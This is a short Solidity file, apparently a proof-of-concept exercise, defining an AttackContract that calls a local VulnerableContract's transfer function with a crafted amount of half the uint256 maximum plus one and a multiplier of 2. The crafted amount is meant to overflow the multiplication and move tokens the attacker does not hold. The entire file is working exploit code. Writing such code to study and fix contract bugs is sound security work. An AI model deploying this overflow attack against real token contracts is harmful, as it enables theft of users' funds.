// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract AttackContract {
    VulnerableContract public token;

    constructor(address _token) {
        token = VulnerableContract(_token);
    }

    function attack(address to) external {
        uint256 numTokens = type(uint256).max / 2 + 1;
        token.transfer(to, numTokens, 2);
    }
}
